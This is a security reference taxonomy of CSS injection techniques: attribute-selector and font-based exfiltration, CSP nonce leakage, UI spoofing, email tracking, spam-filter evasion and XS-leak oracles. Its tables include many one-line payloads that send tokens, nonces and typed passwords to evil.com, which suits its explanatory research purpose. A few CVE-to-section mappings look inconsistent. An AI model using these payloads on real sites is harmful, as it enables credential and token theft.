# CSS Injection Mutation/Variation Taxonomy

---
## Classification Structure

This taxonomy organizes the full attack surface of CSS Injection across three orthogonal axes:

**Axis 1 — Exploitation Primitive (Primary Axis):** The fundamental attack capability achieved through injected CSS. CSS lacks direct code execution in modern browsers, so its attack surface centers on data exfiltration, UI manipulation, and side-channel leakage — capabilities that bypass script-focused defenses like CSP. The exploitation primitive determines what an attacker can extract or manipulate.

**Axis 2 — Injection Context (Cross-Cutting Axis):** The structural location where attacker-controlled input enters the CSS parsing pipeline. This determines which CSS features are available (full stylesheet vs. single property), whether `@import` or `@font-face` can be used, and what constraints apply. The same exfiltration technique may succeed or fail depending entirely on where the injection lands.

**Axis 3 — Attack Scenario (Impact Axis):** The real-world consequence achieved through CSS exploitation. This maps primitives to concrete impact — from CSRF token theft to full account takeover via CSP nonce leakage chains.

### Axis 2 Summary: Injection Context Types

| Injection Context | Available Capabilities | Key Constraint |
|---|---|---|
| **Full `<style>` tag** | All CSS features: selectors, `@import`, `@font-face`, `@media`, animations | Broadest attack surface; requires HTML injection |
| **`style` attribute** | Single-element properties only; no selectors, no `@rules` | No attribute selectors; limited to `url()`, `var()`, `if()` exfiltration |
| **External stylesheet control** | Full CSS from attacker-controlled origin via `<link>` or `@import` | Requires CSP `style-src` to permit the attacker's domain |
| **Relative Path Overwrite (PRSSI)** | Page content reinterpreted as CSS in quirks mode | Requires relative `<link>` path + server path handling + no `X-Content-Type-Options: nosniff` |
| **CSS value injection** | Injecting into an existing CSS property value (e.g., `color: [INPUT]`) | Context-dependent; may allow `url()`, `expression()` (legacy), or property termination |

### Foundational Concept: Why CSS Is an Attack Surface

CSS injection is fundamentally a **scriptless injection** class. Modern browsers do not execute JavaScript through CSS, yet CSS retains powerful capabilities that attackers exploit:

1. **Resource loading** — `url()`, `@import`, `@font-face` trigger network requests controllable by the attacker, serving as data exfiltration channels.
2. **Conditional matching** — Attribute selectors (`input[value^="x"]`), `:has()`, `:valid`, and `@media` queries create boolean oracles that leak page state.
3. **Layout measurement** — Font metrics, scrollbar triggers, and container size queries enable indirect measurement of content dimensions, converting text into detectable signals.
4. **Visual control** — Full control over rendering enables UI redressing, content spoofing, credential phishing, and clickjacking without script execution.
5. **Cross-origin filter processing** — SVG filters applied via CSS can read pixel data from cross-origin iframes, creating a computational side channel.

The combination of these capabilities means CSS injection often achieves comparable impact to XSS — particularly for data theft — while bypassing defenses specifically designed to prevent script execution.

---

## §1. Data Exfiltration via Attribute Selectors

The most widely applicable CSS injection primitive: using CSS attribute selectors to test whether HTML element attributes contain specific character sequences, then triggering network requests that leak the matched characters to an attacker-controlled server.

### §1-1. Sequential Prefix Matching

Character-by-character extraction using the `^=` (starts-with) prefix selector.

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **Basic prefix exfiltration** | `input[value^="a"]{background:url(https://evil.com/?a)}` — each matching selector triggers a request revealing the next character | CSS injection in `<style>` context; target data in an HTML attribute (`value`, `href`, `action`, etc.) |
| **Hidden input bypass via sibling combinator** | `input[type=hidden][value^="a"] ~ *{background:url(...)}` — hidden inputs don't render backgrounds, so the selector targets a visible sibling element | Target token is in `type="hidden"` input; a renderable sibling exists |
| **Hidden input bypass via `:has()` selector** | `html:has(input[name="csrf"][value^="x"]){background:url(...)}` — the `:has()` pseudo-class applies styles to a parent based on child matches | Modern browser with `:has()` support (Chrome 105+, Firefox 121+, Safari 15.4+) |
| **Suffix matching** | `input[value$="z"]{background:url(...)}` — the `$=` selector matches the end of the value, enabling parallel prefix + suffix extraction for 2× speed | Same as basic; doubles exfiltration throughput |
| **Substring matching** | `input[value*="substr"]{background:url(...)}` — tests for arbitrary substrings; combined with overlap analysis, full values can be reconstructed from a single CSS injection | Useful when only one injection opportunity exists |
| **Ad blocker filter rule exfiltration** | Leveraging ad blocker (uBlock Origin, etc.) CSS filter rules themselves as a side-channel — observing DOM mutations or network request differences triggered when cosmetic filters containing specific attribute selectors match page elements to infer sensitive data. The attacker distributes a malicious filter list or injects into an existing one, causing the victim's ad blocker to automatically perform CSS selector-based exfiltration | Victim subscribes to a custom/malicious filter list, or filter list distribution channel is compromised; target page has a predictable DOM structure |

### §1-2. Recursive @import Chaining

Dynamic multi-round exfiltration where the attacker server generates CSS for the next character based on previously leaked data.

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **Sequential import chaining (Chrome)** | Initial `@import url(https://evil.com/start)` triggers a chain: the server holds connections open, waits for each leaked character via background-image request, then responds to the next pending `@import` with selectors targeting the next character position | CSS injection supports `@import`; page can be iframed for repeated stylesheet re-evaluation |
| **Parallel import pre-loading** | Multiple `@import` rules declared upfront; server delays each response until the previous character is leaked, then serves the next round of selectors — no page reload required | Single `<style>` injection with multiple `@import` slots |
| **Firefox single-injection-point variant** | Firefox re-evaluates stylesheets on `@import` completion differently than Chrome; a single injection point with nested `@import` chains enables full extraction without iframing | Firefox browser; single CSS injection point |

### §1-3. CSS Variable Conditional Triggers

Using CSS custom properties (`var()`) as boolean switches to control request firing.

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **Variable-gated background** | `input[value^="a"]{--match:url(https://evil.com/?a)} html{background:var(--match,none)}` — the variable is only defined when the selector matches, gating the background request | CSS injection in `<style>` context; modern browser |
| **Multiple background stacking** | Assign many `var()` references as multiple backgrounds on a single element (e.g., `html`), each gated by a different selector — enables bulk parallel testing | Element supports multiple `background-image` values (practically unlimited) |
| **`if()` conditional chaining** | `style="background:if(style(--val:\"secret\"):url(//evil.com/match);else:none)"` — CSS `if()` function enables conditional requests from inline `style` attributes without selectors | Chrome 137+ `if()` support; injection in `style` attribute context |
| **`attr()` one-shot extraction (limited)** | `input[name="secret"]{background:url(attr(value url))}` — the extended `attr()` function (CSS Values Level 5) would read the entire attribute value as a typed URL, leaking it in a single request. **Note:** Chrome 133 (2025) shipped advanced `attr()` with type coercion support. However, the exfiltration vector is blocked not by lack of browser support but by the **IACVT (Invalid At Computed-Value Time)** restriction — `attr()` values used in URL contexts are tainted and cannot trigger network requests to arbitrary origins. The `image-set(attr(value))` form remains invalid. This is a **constrained vector** gated by IACVT/URL taint rules rather than browser non-implementation | Chrome 133+ supports extended `attr()`; blocked by IACVT URL taint restrictions |

### §1-4. Multi-Element Enumeration

Extracting data from multiple form fields, links, and other elements systematically.

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **Input name and value extraction** | Selectors targeting `input[name^="x"]` leak field names; chained with `input[name="fieldname"][value^="y"]` to extract values | Multiple form fields on page |
| **Form action exfiltration** | `form[action^="x"]{background:url(...)}` leaks the form's submission endpoint | Form element with `action` attribute |
| **Anchor href extraction** | `a[href^="x"]{background:url(...)}` leaks link destinations | Anchor elements with `href` attributes |
| **`:not()` progressive elimination** | `input:not([value^="known1"]):not([value^="known2"])[value^="x"]{...}` eliminates already-discovered values to target subsequent elements | Multiple same-type elements with different values |

---

## §2. Data Exfiltration via Font and Text Measurement

Advanced techniques that extract text content (not just attributes) by exploiting CSS font rendering, glyph metrics, and layout measurement — effective against text nodes that lack selectable attributes.

### §2-1. Font Ligature Width Detection

Custom fonts with ligature glyphs of known widths, combined with scrollbar or container-size detection, reveal which character sequences exist in text nodes.

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **SVG font ligature + scrollbar trigger** | Custom `@font-face` with SVG font defines ligatures (e.g., "sec" → single wide glyph). Applied to a container with `overflow:auto` and constrained width; if the ligature matches, glyph width forces scrollbar appearance, detectable via `scrollbar-gutter` or conditional `background-image` on `::-webkit-scrollbar-thumb` | CSS injection supports `@font-face`; target text in a size-constrained container; Chrome/Edge (scrollbar pseudo-elements) |
| **Container query width detection** | `@container` size queries detect rendered width changes when ligature fonts substitute character sequences — ligature match changes container width, triggering conditional styles that fire network requests | Browser supports CSS Container Queries (`@container`); containment context wraps target text |
| **Font chaining for sequential extraction** | Multiple specially crafted fonts applied in sequence; each font substitutes a known prefix with a distinct glyph, enabling dynamic cycling through ligature substitutions to extract text rapidly | Multiple `@font-face` declarations permitted; sequential import control |

### §2-2. Unicode-Range Character Detection

Using `@font-face` with `unicode-range` to detect which characters are present in text content.

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **Per-character font probe** | `@font-face{font-family:probe_a;src:url(https://evil.com/?char=a);unicode-range:U+0061}` — the font is only fetched if the character 'a' appears in the text where the font is applied | CSS injection supports `@font-face`; `font-src` CSP allows attacker domain (or uses `data:` URIs) |
| **Charset enumeration** | By declaring separate `@font-face` for each character in the target alphabet, the attacker determines the complete charset of the text node from server logs | Broad `unicode-range` coverage; multiple `@font-face` rules |
| **Default font metric differential** | Using pre-installed fonts with distinct character widths (e.g., Comic Sans MS vs. monospace) to detect character identity through layout changes without loading external fonts | No external font loading required; bypass `font-src` restrictions |

### §2-3. Scroll-Based and Animation-Based Detection

Using CSS scroll and animation features to create measurement oracles.

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **`scroll-timeline` content detection** | CSS `scroll-timeline` and `animation-timeline` features tie animations to scroll position; content changes that affect scroll height trigger different animation states, detectable via conditional `background-image` at specific progress points | Browser supports scroll-driven animations (Chrome 115+) |
| **CSS animation as width oracle** | `@keyframes` that progressively change width, combined with `onanimationstart`/`onanimationend` timing (via CSS transitions, not JS), detect when content width crosses thresholds | Animation support; content in measurable container |
| **Scroll-to-Text Fragment (STTF) detection** | URL fragment `#:~:text=secret` scrolls to matching text, causing a scroll position change detectable via `scroll-timeline` CSS animations. **Note:** the `:target` pseudo-class does NOT fire for STTF matches — `:target` only matches elements identified by a named `#fragment`, not text matched by STTF. Detection relies on scroll-position side-channels (§2-3 scroll-timeline), not `:target` selectors | STTF support (Chrome, Edge); scroll-driven animation support; user-activation gesture or same-origin HTML injection |

---

## §3. CSS-Based Script Execution (Legacy)

Direct JavaScript execution through CSS properties — exclusively available in legacy browsers. These vectors are historically significant and remain relevant for attacks targeting legacy environments.

### §3-1. Internet Explorer Expression and Behavior Vectors

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **`expression()` property** | `background:expression(alert(document.cookie))` — IE evaluates the JavaScript expression within the CSS property value, re-executing on every reflow | Internet Explorer 5–8 (removed in IE9 standards mode); forcing docmode 7 in IE 8–10 can re-enable |
| **`behavior` property (HTC)** | `behavior:url(evil.htc)` loads an HTML Component file that executes script in the page context | Internet Explorer; HTC file served from same origin or no cross-origin restriction |
| **`behavior` property (Scriptlet)** | `behavior:url(evil.sct)` loads a Scriptlet file with embedded `<script>` blocks | Internet Explorer; SCT file accessible |
| **Forced docmode regression** | Injecting `<meta http-equiv="X-UA-Compatible" content="IE=7">` forces IE 8–10 into document mode 7, re-enabling `expression()` | HTML injection + CSS injection in IE 8–10 |

### §3-2. Firefox XBL Binding Vectors

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **`-moz-binding` with external XBL** | `style="-moz-binding:url(evil.xml#xss)"` loads an XBL file that attaches script to the element | Firefox 2 (no origin restriction); Firefox 3.0 (same-origin + correct MIME type) |
| **`-moz-binding` with `data:` URI** | `style="-moz-binding:url(data:text/xml,...)"` bypasses same-origin restriction in Firefox 3.0 by using inline data URI | Firefox 3.0; data URI bypass of same-origin check |
| **Chrome-only restriction (Firefox 4+)** | `-moz-binding` restricted to `chrome://` scheme, eliminating web-accessible XBL execution | Firefox 4+; vector fully mitigated |

---

## §4. UI Manipulation and Content Spoofing

CSS injection that modifies the visual presentation of the page to deceive users — enabling phishing, clickjacking, interaction hijacking, and content spoofing without any script execution.

### §4-1. Page Layout Manipulation

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **Element repositioning** | `position:absolute; top:0; left:0; z-index:9999` overlays attacker-controlled content on top of legitimate page elements | CSS injection in `<style>` context; attacker can inject visible HTML elements (via HTML injection) |
| **Element hiding** | `#real-form{display:none}` hides legitimate elements while attacker's injected elements remain visible | CSS injection + HTML injection for replacement content |
| **Security warning suppression** | `.security-warning{margin-top:-9999px}` or `display:none` pushes security indicators off-screen | CSS injection targeting known class/ID of security elements |
| **Negative margin content shift** | Critical page sections shifted off-screen via `margin-top:-9999px` while injected content takes their place | CSS injection with HTML injection |

### §4-2. Credential Phishing via CSS

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **Fake login overlay** | CSS positions an attacker-controlled form over the real login form; `form[action]` can be styled to appear identical to the legitimate interface | CSS + HTML injection; user submits credentials to attacker endpoint |
| **Form action hijacking** | CSS hides the legitimate form and displays a clone with `action` pointing to the attacker's server | Combined HTML/CSS injection |
| **Input field redirection** | CSS `opacity:0` on legitimate inputs, with attacker inputs positioned identically above; keystrokes go to attacker's fields | Fine-grained positional CSS control |

### §4-3. SVG Filter-Based Clickjacking

SVG filters applied via CSS enable reading cross-origin iframe pixel data and creating dynamic interactive overlays — a novel attack class that achieves clickjacking without traditional iframe transparency tricks.

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **Cross-origin pixel reading** | `filter:url(#f)` applied to a cross-origin iframe; SVG `feTile` crops specific pixel regions, `feColorMatrix` extracts color values — revealing button states, text content, and DOM changes | SVG filters applicable to cross-origin iframes (browser-dependent; Firefox bug 2004487) |
| **Logic-gate computation** | `feBlend mode="difference"` implements NOT; `feComposite operator="arithmetic"` implements AND/OR — chained filters create functionally complete logic for pixel-level decision-making | SVG filter support; computational budget sufficient for target complexity |
| **Adaptive overlay generation** | SVG filter pipeline detects DOM state changes (dialog appearance, checkbox selection, error messages) in cross-origin iframe and dynamically adapts the fake overlay UI | Real-time pixel-level state detection; filter applied to live iframe |
| **QR code generation for exfiltration** | `feDisplacementMap` with pre-calculated Reed-Solomon error correction lookup tables encodes extracted data into scannable QR codes rendered entirely within SVG filters | User scans QR code (social engineering); data fits QR capacity |
| **Fake CAPTCHA text extraction** | `feTurbulence` + `feDisplacementMap` distort iframe text to appear as CAPTCHA; users manually re-type the visible text, exfiltrating it through their input | Social engineering; target iframe contains extractable text |

### §4-4. CSS-Only Interaction Hijacking

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **Pointer-events passthrough** | `pointer-events:none` on an overlay allows clicks to pass through to a hidden iframe below, achieving clickjacking without visible iframe | CSS controls pointer events; target page frameable |
| **Cursor manipulation** | `cursor:url(fake-cursor.png) offset, auto` creates a visual cursor offset from the real cursor position, causing users to click on unintended targets | Custom cursor support; precise offset calculation |
| **Content-visibility auto-state** | `content-visibility:auto` + `oncontentvisibilityautostatechange` creates auto-firing events tied to CSS layout state | Browser supports `content-visibility` property |

### §4-5. Dangling Markup via CSS

CSS `url()` function parsing can capture subsequent HTML as part of an unterminated URL string, exfiltrating page content without script execution.

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **Unterminated `url()` capture** | `background:url('https://evil.com/?` — the CSS parser reads characters until the next matching quote, consuming subsequent HTML content as part of the URL. This captures page content (tokens, form data, text) and sends it to the attacker's server as a URL parameter | CSS injection before sensitive page content; CSP allows image requests to attacker domain |
| **`@import` dangling capture** | `@import 'https://evil.com/?` captures subsequent page content until the next matching quote delimiter | Similar to `url()` variant; `@import` at the start of injected CSS context |
| **Font-face source dangling** | `@font-face{font-family:x;src:url('https://evil.com/?` captures content into the font source URL | `@font-face` permitted; CSP `font-src` allows attacker domain |

---

## §5. CSP Nonce and Token Leakage

CSS-specific techniques for extracting Content Security Policy nonces and authentication tokens — the primary chain through which CSS injection escalates to full script execution.

### §5-1. CSP Nonce Exfiltration via Attribute Selectors

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **Script nonce attribute leakage** | `script[nonce^="a"]{background:url(https://evil.com/?a)}` iterates through nonce characters via prefix selectors | Nonce value present in DOM `nonce` attribute; **Note**: modern browsers clear the `nonce` content attribute after parsing, making this ineffective in Chrome 61+/Firefox 75+ |
| **Meta tag CSP nonce leakage** | `meta[content*="nonce-abc"]{background:url(https://evil.com/?abc)}` — when CSP is delivered via `<meta http-equiv="Content-Security-Policy">`, the nonce appears in the `content` attribute, which unlike `<script nonce>` is **not** cleared by the browser and remains accessible to CSS selectors | CSP delivered via `<meta>` tag (not HTTP header); CSS injection exists |
| **Disk-cache nonce reuse** | After leaking the nonce via CSS, the attacker exploits browser disk cache: the page with the known nonce is cached, the attacker updates the injectable payload independently (e.g., via CSRF updating stored input), and forces navigation through a bfcache miss (by holding a `window.open()` reference). The browser falls back to disk cache, restoring the original HTML with the leaked nonce while server-side content now includes `<script nonce="[known]">` | CSS injection; CSP via `<meta>` tag; payload updatable independently; Chrome disk-cache fallback on bfcache miss |
| **MathML namespace nonce leak** | Browsers clear the `nonce` content attribute from `<script>` elements after parsing to prevent CSS exfiltration, but this protection does not apply inside MathML namespace. A dangling `<math>` tag injected before a target `<script nonce="...">` causes the script element to be parsed in MathML context, where the `nonce` attribute remains accessible to CSS selectors (`script[nonce^="a"]{background:url(...)}`) and the `attr()` function. Combine with server-side HTML injection to position the dangling `<math>` tag | CSP with nonce-based policy (HTTP header or `<meta>` tag); CSS injection point in same page; server-side HTML injection to dangle `<math>` before target `<script nonce>` element |

### §5-2. OAuth and Session Token Extraction

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **CSRF token exfiltration** | `input[name="csrf_token"][value^="x"]{background:url(...)}` — the most common CSS injection exploitation target; CSRF tokens are typically in `type="hidden"` inputs, requiring `:has()` or sibling-combinator bypass | CSRF token in HTML attribute; CSS injection in same page |
| **OAuth token leakage** | CSS injection combined with OAuth misconfiguration to leak victim's access token via attribute selectors targeting token-bearing elements or redirect URLs | CSS injection on OAuth callback page; token reflected in DOM attribute |
| **Session identifier extraction** | Targeting elements that contain session IDs, API keys, or bearer tokens rendered in DOM attributes | Sensitive token present in accessible HTML attribute |

### §5-3. CSS-to-XSS Escalation Chains

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **Nonce leak → script injection** | CSS exfiltrates CSP nonce (§5-1) → attacker injects `<script nonce="[leaked]">` in a separate injection point or via cache manipulation | Two injection points (CSS + HTML) or cache-based payload delivery |
| **RPO + quirks mode → CSS exfiltration → nonce** | Relative Path Overwrite forces page content to be parsed as CSS in quirks mode; reflected text becomes CSS selectors; combined with frame-counting as a no-network-request oracle to leak nonce | PRSSI-vulnerable page; PHP warnings force quirks mode; reflected input |
| **`@import` to external stylesheet → full CSS control** | `@import url(https://evil.com/payload.css)` loads attacker's complete stylesheet, enabling all §1–§5 techniques | CSP `style-src` permits the attacker's domain or `*` |

---

## §6. User Tracking and Fingerprinting

CSS capabilities that identify users, track behavior, and fingerprint environments — particularly relevant in email contexts where JavaScript is blocked but CSS executes.

### §6-1. Email-Based CSS Tracking

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **CSS background-image open tracking** | `background-image:url(https://tracker.com/pixel?uid=X)` in email HTML; image loads when email is rendered | Email client renders external CSS images (most clients except Apple Mail Privacy Protection) |
| **External stylesheet open detection** | `<link rel="stylesheet" href="https://tracker.com/style.css?uid=X">` — Apple Mail preloads the stylesheet but not its referenced images; image inside CSS only loads on actual open | Apple Mail; distinction between prefetch and real open |
| **Interaction tracking via `:hover`/`:checked`** | `a:hover{background:url(https://tracker.com/?hovered=link1)}` and `input:checked+label{background:url(...)}` detect user interactions in interactive emails | Email client supports CSS pseudo-classes (limited support) |
| **Print detection** | `@media print{body{background:url(https://tracker.com/?action=print)}}` detects when users print the email | Email client supports `@media print` |

### §6-2. Environment Fingerprinting via @media Queries

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **Screen resolution detection** | `@media(min-width:1920px){body{background:url(...?w=1920)}}` — media queries at 1px intervals reveal exact viewport dimensions | CSS injection or email; browser evaluates media queries |
| **Color scheme preference** | `@media(prefers-color-scheme:dark){...url(...?dark=1)}` detects OS dark mode setting | Browser/email client supports `prefers-color-scheme` |
| **Pointer type detection** | `@media(any-pointer:coarse){...url(...?touch=1)}` distinguishes touch vs. mouse input | Browser supports `any-pointer` media feature |
| **Color depth and HDR detection** | `@media(color-gamut:p3){...}` and `@media(dynamic-range:high){...}` fingerprint display capabilities | Modern browser with extended media features |
| **Font-based OS detection** | `@font-face{font-family:win;src:local('Segoe UI')}` combined with element that triggers network request only if font is available — Segoe UI indicates Windows, Helvetica Neue indicates macOS, Ubuntu/Cantarell indicates Linux | `local()` font probing; OS-default fonts distinguishable |

### §6-3. CSS Keylogging

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **Input value tracking** | `input[type="password"][value$="a"]{background:url(https://evil.com/?last=a)}` fires a request each time the last character changes, revealing password characters as typed | **Critical limitation**: only works if JavaScript dynamically updates the `value` attribute to reflect typed content — native browser behavior does not update the DOM attribute on keypress |
| **React/Vue controlled component keylogging** | React's controlled inputs (`value={state}`) update the DOM `value` attribute on every keystroke via virtual DOM reconciliation, enabling CSS attribute selectors to detect each character | React/Vue/Angular app with controlled input components; CSS injection |

### §6-4. CSS-Assisted Form Spoofing

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **Form spoofing via CSS class reuse (Mastodon)** | On the Infosec Mastodon instance, an HTML filter bypass in the `title` attribute allowed injection of hidden `<input>` fields. Rather than CSS attribute selector exfiltration, the attack reused existing Mastodon CSS classes (e.g., `react-toggle-track-check` with `opacity:0`) to visually conceal injected username and password fields — requiring no inline CSS and no CSP bypass. Chrome's password autofill automatically populated the hidden fields without user interaction. A spoofed toolbar with legitimate-looking buttons surrounded the invisible inputs; clicking any button submitted the form with captured credentials to an attacker-controlled server via HTTP POST. Demonstrates that existing CSS classes can serve as concealment primitives for form-spoofing attacks, extending CSS injection impact beyond data exfiltration | HTML injection possible (even limited); application has CSS classes producing `opacity:0` or equivalent concealment; browser autofill enabled; no `form-action` CSP directive |

---

## §7. Detection Evasion via CSS (Email Context)

CSS properties exploited to evade spam filters, content analyzers, and brand-detection systems — a distinct attack category where CSS is the evasion mechanism rather than the injection payload.

### §7-1. Hidden Text Salting

Inserting invisible text via CSS to disrupt keyword-based detection engines.

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **Zero-width character insertion** | Zero-width spaces (U+200B), zero-width non-joiners (U+200C), and zero-width joiners (U+200D) inserted between brand-name characters: `M​i​c​r​o​s​o​f​t` → defeats substring matching | Email context; text-based detection system |
| **font-size:0 concealment** | `<span style="font-size:0">garbage text</span>` renders invisible text between legitimate words, confusing NLP/keyword parsers | Inline CSS permitted by email client |
| **opacity:0 overlay** | `<span style="opacity:0">irrelevant phrases</span>` makes text fully transparent | Inline CSS; detection engine reads raw HTML text |
| **color-matching concealment** | `<span style="color:#ffffff">hidden</span>` on white background makes text invisible to human readers | Inline CSS; known background color |
| **Clip/overflow concealment** | `overflow:hidden; width:0; height:0` or `clip-path:inset(100%)` makes container invisible while content exists in DOM | Inline CSS; parsing engine reads DOM text |
| **Negative text-indent** | `text-indent:-9999px` pushes text far off-screen while remaining in DOM | Inline CSS; content analyzers read DOM |

### §7-2. Language Detection Disruption

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **Invisible multilingual padding** | Hidden CSS-concealed phrases in different languages (e.g., German, Japanese) embedded in an English phishing email to confuse language detection models like Microsoft EOP | CSS concealment; language-based filtering |
| **Intent manipulation** | Small invisible CSS-concealed positive-sentiment text shifts the verdict of an email from "neutral/suspicious" to "positive/safe", evading sentiment-based detection | Minimal salt sufficient to alter ML classifier output |

---

## §8. Injection Entry Points and Amplification

How CSS injection is achieved in the first place — the initial vulnerability that enables all subsequent exploitation primitives.

### §8-1. Direct CSS Injection Points

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **Reflected CSS injection** | User input reflected inside a `<style>` block or `style` attribute without proper encoding: `<style>.class{color:[INPUT]}</style>` | Application embeds user input in CSS context without escaping `}`, `{`, `;`, `url()` |
| **Stored CSS injection** | Attacker-controlled CSS persisted in database and rendered in subsequent page views (e.g., user profile customization, theme settings, CMS template editing) | Application stores and renders user-supplied CSS |
| **HTML injection escalating to CSS** | HTML injection (`<style>...`) used to introduce a CSS context even when the application didn't originally have one | HTML injection vulnerability; CSP does not block `unsafe-inline` for styles |
| **`class` or `id` attribute injection** | User input reflected in `class` or `id` attributes; combined with attacker-controlled external stylesheet, enables targeted styling rules | Controlled `class`/`id` + ability to load external CSS |

### §8-2. Path-Relative Stylesheet Import (PRSSI / RPO)

Tricking browsers into parsing HTML pages as CSS through path manipulation.

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **Basic RPO** | Page uses `<link rel="stylesheet" href="style.css">` (relative path); attacker navigates to `/page.php/style.css`, causing server to serve `page.php` content; browser interprets the HTML response as CSS in quirks mode, extracting injected CSS rules from reflected input | Relative CSS `<link>`; server ignores path suffix; no `<base>` tag; no `X-Content-Type-Options: nosniff`; quirks mode or no `Content-Type` |
| **RPO with PHP warnings** | PHP warnings emitted before page content trigger quirks mode in the browser; combined with RPO, this forces the browser to accept the HTML-containing-PHP-output as a valid CSS stylesheet | PHP `display_errors = On`; relative CSS import; reflected input |
| **RPO + 404 page reflection** | Navigating to a non-existent path returns a 404 page that reflects the requested URL; when this 404 content is imported as a stylesheet, the reflected URL becomes injectable CSS | 404 page reflects URL path; relative CSS import; lenient MIME handling |

### §8-3. Third-Party and Supply Chain CSS Injection

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **Compromised CDN stylesheet** | Attacker compromises a CDN-hosted CSS file used by multiple sites; injected CSS exfiltrates data from all dependent applications | No Subresource Integrity (`integrity` attribute) on `<link>` tag |
| **CSS library supply chain** | Malicious CSS injected into a popular CSS package (npm, CDN) — `url()` in properties like `font-face`, `cursor`, or `background` silently exfiltrate page data | No SRI; no CSS content auditing |
| **Browser extension CSS injection** | Malicious or compromised browser extension injects CSS with `content_scripts` or `insertCSS()` into all visited pages | User has installed malicious extension |

---

## §9. Side-Channel and XS-Leak Primitives

CSS-only techniques that leak information through indirect channels — timing, resource consumption, frame counting — even when direct network exfiltration is blocked by CSP.

### §9-1. No-Network-Request Oracles

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **Frame counting oracle** | `html:has(input[value^="x"]) #leak{display:none}` conditionally hides an `<object data="about:blank">` element; cross-origin attacker reads `window.frames.length` to detect if the object was hidden (selector matched) | Cross-origin page access; CSS injection; `window.frames.length` readable |
| **Connection pool exhaustion** | CSS forces selector-dependent resource loads that saturate the browser's TCP connection pool (~256 connections); cross-origin timing detects whether pool saturation occurred (slower requests), revealing selector matches | No direct network exfiltration needed; timing side-channel; cross-origin page |
| **Tab crash detection** | CSS recursive variable reference (`--a:var(--b);--b:var(--a)`) causes browser tab crash when a selector matches; cross-origin detection via `window.history.length` or hash navigation checks whether the tab survived | CSS injection; browser-specific crash behavior; cross-origin page reference |
| **Named window property detection** | CSS conditionally creates/hides `<iframe name="x">`; cross-origin attacker tests `window.x !== undefined` to detect selector matches | CSS controls iframe visibility; cross-origin window reference |

### §9-2. `:valid`/`:invalid` Form State Oracle

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **Regex pattern matching** | `<input pattern="^secret.*" value="[target]">` combined with `:valid{background:url(https://evil.com/?match)}` — the `:valid` pseudo-class fires when the input value matches the regex pattern, creating a CSS-only regex oracle | HTML injection for `<input pattern>`; CSS injection for `:valid` styling; or PRSSI context |

---

## Attack Scenario Mapping (Axis 3)

| Scenario | Architecture | Primary Mutation Categories |
|---|---|---|
| **CSRF Token Theft** | Any application with CSRF tokens in hidden inputs | §1-1 + §1-2 — Sequential prefix matching with recursive import for automated extraction |
| **CSP Nonce Leakage → XSS** | Applications with CSP via `<meta>` tag | §5-1 + §5-3 — Meta tag nonce exfiltration chained with disk-cache reuse for script injection |
| **OAuth Token Theft** | OAuth callback pages with token in DOM | §5-2 + §1-3 — CSS variable triggers extract token from callback page attributes |
| **Credential Phishing** | Any injectable page with login context | §4-1 + §4-2 — UI manipulation presents fake login form over legitimate content |
| **Cross-Origin Data Exfiltration** | Frameable target with CSS injection | §4-3 + §9-1 — SVG filter pixel reading or frame-counting oracle for cross-origin data |
| **Email Surveillance** | Email campaigns with CSS tracking | §6-1 + §6-2 — Open tracking + environment fingerprinting via media queries |
| **Spam Filter Bypass** | Phishing/scam email campaigns | §7-1 + §7-2 — Text salting + language detection disruption |
| **Password Theft** | React/Vue apps with controlled inputs | §6-3 + §1-1 — CSS keylogging on framework-managed input fields |
| **Sensitive Text Extraction** | Pages with secrets in text nodes | §2-1 + §2-2 — Font ligature + unicode-range character detection |
| **Supply Chain Data Theft** | Sites loading CSS from compromised CDN | §8-3 + §1-1 — Compromised stylesheet with attribute selector exfiltration |

---

## CVE / Bounty Mapping (2024–2026)

| Mutation Combination | CVE / Case | Impact / Bounty |
|---|---|---|
| §5-2 (OAuth token via CSS exfiltration) | OAuth token theft writeup (2024) | CSS exfiltration chained with OAuth misconfiguration; public bounty writeup |
| §5-1 + §5-3 (Nonce leak + disk cache) | Nonce CSP bypass via Disk Cache (2025) | CSP nonce extracted via CSS meta tag selectors; disk cache reuse enables script execution. Nominated for PortSwigger Top 10 2025 |
| §8-2 + §9-2 (RPO + quirks mode + frame oracle) | Forcing Quirks Mode + CSS Exfiltration without Network (2025) | PHP warnings force quirks mode; 404-reflected text as CSS sink; `:valid` regex + frame-counting oracle. Nominated for PortSwigger Top 10 2025 |
| §4-3 (SVG filter clickjacking) | SVG Clickjacking Research (2025) | Cross-origin pixel reading via SVG filters; Google Docs data exfiltration PoC; Google VRP bounty |
| §8-1 (CSS injection in XWiki) | CVE-2026-26000 (XWiki) | CSS injection in comment functionality; clickjacking via CSS; any user with comment permissions |
| §3-1 (Chrome CSS use-after-free) | CVE-2026-2441 (Chrome) | High-severity use-after-free in Chrome CSS; Google confirmed exploitation in the wild |
| §8-1 (Swagger UI CSS injection) | CSS injection in Swagger UI (2024) | CSS injection in API documentation tool; data exfiltration from API pages |
| §8-2 (PRSSI in Keycloak) | Keycloak Issue #18032 | Relative CSS link paths enable PRSSI; CSS injection via RPO on authentication pages |
